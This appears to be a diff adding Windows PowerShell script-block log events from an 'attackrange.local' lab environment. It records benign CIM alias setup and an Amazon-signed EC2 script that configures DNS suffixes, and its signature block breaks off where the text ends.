+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:06:15.091947700Z'/><EventRecordID>226869</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0001-89BA-F62E5457D901}'/><Execution ProcessID='15960' ThreadID='18736'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>c637e5fe-d12e-48eb-8c9d-a5beee7911c2</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:06:15.091929700Z'/><EventRecordID>226863</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0001-89BA-F62E5457D901}'/><Execution ProcessID='15960' ThreadID='18736'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>e62ea3c2-bd61-4230-a1a3-2cfb4064700c</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:06:15.091918600Z'/><EventRecordID>226857</EventRecordID><Correlation ActivityID='{2EF1732A-5754-0001-89BA-F62E5457D901}'/><Execution ProcessID='15960' ThreadID='18736'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>b7612e1d-d191-4ba0-98d6-d1a41bec6f02</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:36.841066300Z'/><EventRecordID>699692</EventRecordID><Correlation ActivityID='{2E415885-5754-0000-CA51-472E5457D901}'/><Execution ProcessID='5832' ThreadID='6008'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>05596dc6-4374-4072-8acd-73206f6335e5</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:36.841055300Z'/><EventRecordID>699686</EventRecordID><Correlation ActivityID='{2E415885-5754-0000-CA51-472E5457D901}'/><Execution ProcessID='5832' ThreadID='6008'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>c36e90bf-c906-457a-afce-2ee4eabf1fe5</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:36.841044200Z'/><EventRecordID>699680</EventRecordID><Correlation ActivityID='{2E415885-5754-0000-CA51-472E5457D901}'/><Execution ProcessID='5832' ThreadID='6008'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>0874747a-cbfd-4d35-840f-b10c01aad1e8</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:13.351245400Z'/><EventRecordID>698873</EventRecordID><Correlation ActivityID='{2E415885-5754-0001-E826-442E5457D901}'/><Execution ProcessID='5176' ThreadID='5680'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>ea66ccf9-b020-4783-9664-fe343e4d0b03</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:13.351224900Z'/><EventRecordID>698867</EventRecordID><Correlation ActivityID='{2E415885-5754-0001-E826-442E5457D901}'/><Execution ProcessID='5176' ThreadID='5680'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>ff74ea1b-20cd-4238-8fe5-41fee99a7f4e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:13.351201600Z'/><EventRecordID>698861</EventRecordID><Correlation ActivityID='{2E415885-5754-0001-E826-442E5457D901}'/><Execution ProcessID='5176' ThreadID='5680'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>aac4cf34-fe2c-4860-81ba-6b9419b3d24f</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T12:31:09.718798800Z'/><EventRecordID>698586</EventRecordID><Correlation ActivityID='{2E415885-5754-0000-F750-472E5457D901}'/><Execution ProcessID='5176' ThreadID='5680'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-dc01.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>2</Data><Data Name='ScriptBlockText'># Copyright 2016 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+#
+# Licensed under the Amazon Software License (the "License").
+# You may not use this file except in compliance with the License.
+# A copy of the License is located at
+#
+# http://aws.amazon.com/asl/
+#
+# or in the "license" file accompanying this file. This file is distributed
+# on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
+# express or implied. See the License for the specific language governing
+# permissions and limitations under the License.
+
+&lt;#-----------------------------------------------------------------------------------------------------------
+    Add-DnsSuffixList adds DNS suffixes.
+-------------------------------------------------------------------------------------------------------------#&gt;
+function Add-DnsSuffixList
+{
+  $state = Get-LaunchConfig -Key AddDnsSuffixList
+  [System.GC]::Collect()
+  if (-not $state)
+  {
+    Write-Log "Adding DNS suffix list is disabled"
+    return
+  }
+
+  $suffixList = @()
+
+  Write-Log ("Adding DNS suffixes in search list begins")
+
+  # Try to create a suffix with available zone
+  try
+  {
+    # Availability-zone includes period at the end, so it needs to remove it.
+    $availabilityZone = (Get-Metadata -UrlFragment "meta-data/placement/availability-zone").Trim()
+    if ($availabilityZone.EndsWith("."))
+    {
+      $availabilityZone = $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+    }
+
+    $suffixList += "{0}.ec2-utilities.amazonaws.com" -f $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get availability zone: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get global search list
+  try
+  {
+    $tcpRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+    $tcpRegRes = Get-ItemProperty -Path $tcpRegPath
+    $existingList = $tcpRegRes.SearchList -split ","
+    foreach ($existing in $existingList)
+    {
+      if ($existing -and $suffixList -notcontains $existing)
+      {
+        $suffixList += $existing.ToLower()
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get global search list: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain
+  try
+  {
+    $dnsDomain = $tcpRegRes.Domain
+    if ($dnsDomain -and $suffixList -notcontains $dnsDomain)
+    {
+      $suffixList += $dnsDomain.ToLower()
+    }
+    $isUsingDomainDevolution = $tcpRegRes.UseDomainNameDevolution
+    if ($isUsingDomainDevolution -ne 0)
+    {
+      $dnsDomains = $dnsDomain -split "\."
+      if ($dnsDomains.Length -gt 2)
+      {
+        $dns = $dnsDomains.Get($dnsDomains.Length - 1)
+        for ($i = $dnsDomains.Length - 2; $i -ge 1; $i --)
+        {
+          $dns = "{0}.{1}" -f $dnsDomains.Get($i),$dns
+          if ($dns -and $suffixList -notcontains $dns)
+          {
+            $suffixList += $dns.ToLower()
+          }
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from registry: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get NV Domain - contains computer's primary DNS suffix
+  try
+  {
+    $nvDomain = $tcpRegRes. "NV Domain"
+    if ($nvDomain -and $suffixList -notcontains $nvDomain)
+    {
+      $suffixList += $nvDomain.ToLower()
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get NV domain: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain from connected NICs
+  try
+  {
+    $networkAdapters = Get-CimInstance -ClassName Win32_NetworkAdapter
+    foreach ($networkAdapter in $networkAdapters)
+    {
+      # Check each NIC if it is connected (Connected = 2)
+      if ($networkAdapter.NetConnectionStatus -eq 2)
+      {
+        $networkConfig = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "Index='$($networkAdapter.Index)'"
+        $nicDnsDomain = $networkConfig.DNSDomain
+        if ($nicDnsDomain -and $suffixList -notcontains $nicDnsDomain)
+        {
+          $suffixList += $nicDnsDomain.ToLower()
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from NICs: {0}" -f $_.Exception.Message)
+  }
+
+  try
+  {
+    # Set DNS suffix search list
+    Invoke-CimMethod -ClassName Win32_NetworkAdapterConfiguration -MethodName "SetDNSSuffixSearchOrder" -Arguments @{ DNSDomainSuffixSearchOrder = $suffixList } | Out-Null
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to set DNS suffix search list: {0}" -f $_.Exception.Message)
+  }
+
+  Write-Log ("Adding DNS suffixes in search list done")
+}
+
+# SIG # Begin signature block
+# MIIuqgYJKoZIhvcNAQcCoIIumzCCLpcCAQExDzANBglghkgBZQMEAgEFADB5Bgor
+# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
+# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwdXMjmgee8GrG
+# wK7q1ggMNwj1l3PZixsOVf6I/u33B6CCFBkwggXAMIIEqKADAgECAhAP0bvKeWvX
+# +N1MguEKmpYxMA0GCSqGSIb3DQEBCwUAMGwxCzAJBgNVBAYTAlVTMRUwEwYDVQQK
+# EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xKzApBgNV
+# BAMTIkRpZ2lDZXJ0IEhpZ2ggQXNzdXJhbmNlIEVWIFJvb3QgQ0EwHhcNMjIwMTEz
+# MDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMM
+# RGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQD
+# ExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIiMA0GCSqGSIb3DQEBAQUAA4IC
+# DwAwggIKAoICAQC/5pBzaN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa
+# za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F/WBTxSD1Ifxp4VpX6+n6lXFllV
+# cq9ok3DCsrp1mWpzMpTREEQQLt+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT
+# +CFhmzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiODCu3T6cw2Vbuyntd
+# 463JT17lNecxy9qTXtyOj4DatpGYQJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+
+# EJFwq1WCQTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/CNdaSaTC5qmgZ92k
+# J7yhTzm1EVgX9yRcRo9k98FpiHaYdj1ZXUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5j
+# rubU75KSOp493ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4/3IbKyEbe7
+# f/LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPRiQfhvbfmQ6QYuKZ3AeEPlAwhHbJU
+# KSWJbOUOUlFHdL4mrLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU/Y+wh
+# X8QgUWtvsauGi0/C1kVfnSD8oR7FwI+isX4KJpn15GkvmB0t9dmpsh3lGwIDAQAB
+# o4IBZjCCAWIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n
+# P+e6mK4cD08wHwYDVR0jBBgwFoAUsT7DaQP4v0cB1JgmGggC72NkK8MwDgYDVR0P
+# AQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMDMH8GCCsGAQUFBwEBBHMwcTAk
+# BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEkGCCsGAQUFBzAC
+# hj1odHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRIaWdoQXNzdXJh
+# bmNlRVZSb290Q0EuY3J0MEsGA1UdHwREMEIwQKA+oDyGOmh0dHA6Ly9jcmwzLmRp
+# Z2ljZXJ0LmNvbS9EaWdpQ2VydEhpZ2hBc3N1cmFuY2VFVlJvb3RDQS5jcmwwHAYD
+# VR0gBBUwEzAHBgVngQwBAzAIBgZngQwBBAEwDQYJKoZIhvcNAQELBQADggEBAEHx
+# qRH0DxNHecllao3A7pgEpMbjDPKisedfYk/ak1k2zfIe4R7sD+EbP5HU5A/C5pg0
+# /xkPZigfT2IxpCrhKhO61z7H0ZL+q93fqpgzRh9Onr3g7QdG64AupP2uU7SkwaT1
+# IY1rzAGt9Rnu15ClMlIr28xzDxj4+87eg3Gn77tRWwR2L62t0+od/P1Tk+WMieNg
+# GbngLyOOLFxJy34riDkruQZhiPOuAnZ2dMFkkbiJUZflhX0901emWG4f7vtpYeJa
+# 3Cgh6GO6Ps9W7Zrk9wXqyvPsEt84zdp7PiuTUy9cUQBY3pBIowrHC/Q7bVUx8ALM
+# R3eWUaNetbxcyEMRoacwggawMIIEmKADAgECAhAIrUCyYNKcTJ9ezam9k67ZMA0G
+# CSqGSIb3DQEBDAUAMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ
+# bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0
+# IFRydXN0ZWQgUm9vdCBHNDAeFw0yMTA0MjkwMDAwMDBaFw0zNjA0MjgyMzU5NTla
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDVtC9C
+# 0CiteLdd1TlZG7GIQvUzjOs9gZdwxbvEhSYwn6SOaNhc9es0JAfhS0/TeEP0F9ce
+# 2vnS1WcaUk8OoVf8iJnBkcyBAz5NcCRks43iCH00fUyAVxJrQ5qZ8sU7H/Lvy0da
+# E6ZMswEgJfMQ04uy+wjwiuCdCcBlp/qYgEk1hz1RGeiQIXhFLqGfLOEYwhrMxe6T
+# SXBCMo/7xuoc82VokaJNTIIRSFJo3hC9FFdd6BgTZcV/sk+FLEikVoQ11vkunKoA
+# FdE3/hoGlMJ8yOobMubKwvSnowMOdKWvObarYBLj6Na59zHh3K3kGKDYwSNHR7Oh
+# D26jq22YBoMbt2pnLdK9RBqSEIGPsDsJ18ebMlrC/2pgVItJwZPt4bRc4G/rJvmM
+# 1bL5OBDm6s6R9b7T+2+TYTRcvJNFKIM2KmYoX7BzzosmJQayg9Rc9hUZTO1i4F4z
+# 8ujo7AqnsAMrkbI2eb73rQgedaZlzLvjSFDzd5Ea/ttQokbIYViY9XwCFjyDKK05
+# huzUtw1T0PhH5nUwjewwk3YUpltLXXRhTT8SkXbev1jLchApQfDVxW0mdmgRQRNY
+# mtwmKwH0iU1Z23jPgUo+QEdfyYFQc4UQIyFZYIpkVMHMIRroOBl8ZhzNeDhFMJlP
+# /2NPTLuqDQhTQXxYPUez+rbsjDIJAsxsPAxWEQIDAQABo4IBWTCCAVUwEgYDVR0T
+# AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUaDfg67Y7+F8Rhvv+YXsIiGX0TkIwHwYD
+# VR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4cD08wDgYDVR0PAQH/BAQDAgGGMBMG
+# A1UdJQQMMAoGCCsGAQUFBwMDMHcGCCsGAQUFBwEBBGswaTAkBggrBgEFBQcwAYYY
+# aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2Fj
+# ZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNydDBDBgNV
+# HR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkUm9vdEc0LmNybDAcBgNVHSAEFTATMAcGBWeBDAEDMAgGBmeBDAEEATAN
+# BgkqhkiG9w0BAQwFAAOCAgEAOiNEPY0Idu6PvDqZ01bgAhql+Eg08yy25nRm95Ry
+# sQDKr2wwJxMSnpBEn0v9nqN8JtU3vDpdSG2V1T9J9Ce7FoFFUP2cvbaF4HZ+N3HL
+# IvdaqpDP9ZNq4+sg0dVQeYiaiorBtr2hSBh+3NiAGhEZGM1hmYFW9snjdufE5Btf
+# Q/g+lP92OT2e1JnPSt0o618moZVYSNUa/tcnP/2Q0XaG3RywYFzzDaju4ImhvTnh
+# OE7abrs2nfvlIVNaw8rpavGiPttDuDPITzgUkpn13c5UbdldAhQfQDN8A+KVssIh
+# dXNSy0bYxDQcoqVLjc1vdjcshT8azibpGL6QB7BDf5WIIIJw8MzK7/0pNVwfiThV
+# 9zeKiwmhywvpMRr/LhlcOXHhvpynCgbWJme3kuZOX956rEnPLqR0kq3bPKSchh/j
+# wVYbKyP/j7XqiHtwa+aguv06P0WmxOgWkVKLQcBIhEuWTatEQOON8BUozu3xGFYH
+# Ki8QxAwIZDwzj64ojDzLj4gLDb879M4ee47vtevLt/B3E+bnKD+sEq6lLyJsQfmC
+# XBVmzGwOysWGw/YmMwwHS6DTBwJqakAwSEs0qFEgu60bhQjiWQ1tygVQK+pKHJ6l
+# /aCnHwZ05/LWUpD9r4VIIflXO7ScA+2GRfS0YW6/aOImYIbqyK+p/pQd52MbOoZW
+# eE4wggedMIIFhaADAgECAhACxyVvD/v+ctpMbqqoNdVVMA0GCSqGSIb3DQEBCwUA
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTEwHhcNMjIxMTA1MDAwMDAwWhcNMjMxMTA4MjM1OTU5WjCB8jET
+# MBEGCysGAQQBgjc8AgEDEwJVUzEZMBcGCysGAQQBgjc8AgECEwhEZWxhd2FyZTEd
+# MBsGA1UEDwwUUHJpdmF0ZSBPcmdhbml6YXRpb24xEDAOBgNVBAUTBzQxNTI5NTQx
+# CzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdTZWF0
+# dGxlMSIwIAYDVQQKExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMuMRMwEQYDVQQL
+# EwpBbWF6b24gRUMyMSIwIAYDVQQDExlBbWF6b24gV2ViIFNlcnZpY2VzLCBJbmMu
+# MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA0jWbhD4ghdeO4Nndy/2h
+# vCCUPPKnL63myeBZYItXG1dnB5gpJIrBVu40V4OaiNwyUAiBrO5eGM4IaWLqbxvj
+# 324KRuXtmHcXvF7YRgiciflrsfzoUEu4TdKj+owTNA2uektzbVLWzT0wFKe5n4Xe
+# CAqQQe33ODVB+cBTUSv/TRWf3Edni17S8HldwSq+YvPIRv21Shp7fiCxO45ETxwl
+# BsoeNrwLAQz0QpiaGdY5Fb+12jcoWRqYqAiXGeDLA7Wxq1+Xj2n+UwelzhYfcE5/
+# p8w4FsFJi9tVb0aWS63OnP+aTOCrA5bz5j9wq8x25/hCGm6HktmbZRwjKiFQ+HdL
+# g0t3250T9hxvXjudh/DGPCIcmQzKBuxijP8f60DutqLk/EsS+Z5xD/s9/rruXfAj
+# czkZ/xpHLHKa+Fp7x+tIwuC5Zq6VAM6CFgJOWefYG5h8sjZFhrphbnYzs0C75SCx
+# KOKFe6RyrQ+O+xh96ky4kw47zNXbbc7xBqVjLjbOgSTFAgMBAAGjggI1MIICMTAf
+# BgNVHSMEGDAWgBRoN+Drtjv4XxGG+/5hewiIZfROQjAdBgNVHQ4EFgQUOv3VJlso
+# 3pHAv43pOWMQfdVdjXkwLgYDVR0RBCcwJaAjBggrBgEFBQcIA6AXMBUME1VTLURF
+# TEFXQVJFLTQxNTI5NTQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUF
+# BwMDMIG1BgNVHR8Ega0wgaowU6BRoE+GTWh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNv
+# bS9EaWdpQ2VydFRydXN0ZWRHNENvZGVTaWduaW5nUlNBNDA5NlNIQTM4NDIwMjFD
+# QTEuY3JsMFOgUaBPhk1odHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRU
+# cnVzdGVkRzRDb2RlU2lnbmluZ1JTQTQwOTZTSEEzODQyMDIxQ0ExLmNybDA9BgNV
+# HSAENjA0MDIGBWeBDAEDMCkwJwYIKwYBBQUHAgEWG2h0dHA6Ly93d3cuZGlnaWNl
+# cnQuY29tL0NQUzCBlAYIKwYBBQUHAQEEgYcwgYQwJAYIKwYBBQUHMAGGGGh0dHA6
+# Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBcBggrBgEFBQcwAoZQaHR0cDovL2NhY2VydHMu
+# ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0Q29kZVNpZ25pbmdSU0E0MDk2
+# U0hBMzg0MjAyMUNBMS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG9w0BAQsFAAOC
+# AgEARxdSHXYd6BO2G0SQESFEKuC2xGsuekZq4Q//Jg3mHKBkDSLrK1PEriBExb5n
+# JNAmCoh374kLOj9fbV5kPmj2kTdH65b1GVIp4VADVOwla1NGrbqFIvSzUN68xqWw
+# ITM15yR5OU4peuSD8pdxGLwIM3YEsorhVugVI/TZ3oSs89vMNKIUK4qrHvDpveUf
+# 1tQKFYUwyKEkauDqovs2pS7G6+1mqSgXx4Nt1OdZwwdXS8d14xcsaz96C+4G7fAr
+# lbcKiGnHwxlO0FaC+piuverA1NU3lw8UFlTdaQxldKhS47iKZaWTS+mwi2H5PC2G
+# cgXNlQG5tuh/TimhfHpqrvtrXBpNQTU6ydv6E/Bj6DE5VkJGIKua0GvI7LkwFBFC
+# WD1hrAEjtY2LkPAgMDQe9iqPoEGeNwZeEjJjLgayPLP7NsJRdA6uhXboMEFW2LNf
+# VM/hdzl1RG/5kJ4La/mEkpvQRtZRbaSPuSHRxGz//P62qKFQGL0K/YI9RlowyGrQ
+# ENfvztdmqPN8xLJ7C7IuWkx2ygO++4Vva/DaiXX2gMtt6hYYfngOt6+beRWLbpdr
+# cNgUrUJAGg8saVOkrBdziuB0fS93jso0mBvz0DTFXE5vvE8yOYQWR0njIOKbZuB5
+# A15FSIngJ+joE7MFjkxwkQwx5czjrG0GVfqSSK8WiL5yq2wxghnnMIIZ4wIBATB9
+# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
+# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBDb2RlIFNpZ25pbmcgUlNBNDA5NiBTSEEz
+# ODQgMjAyMSBDQTECEALHJW8P+/5y2kxuqqg11VUwDQYJYIZIAWUDBAIBBQCgfDAQ
+# BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
+# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgW5Ej8brX
+# 5YlTBkoyY2drpoCT/V57IcT8S8Iq8hJJVtswDQYJKoZIhvcNAQEBBQAEggGAt5Ty
+# 7obsD/Z0ezG66VhUH0wII01W42R03uEEvqZg2YFV6D+kt5pnjZ4xSz+Vu0EP3eth
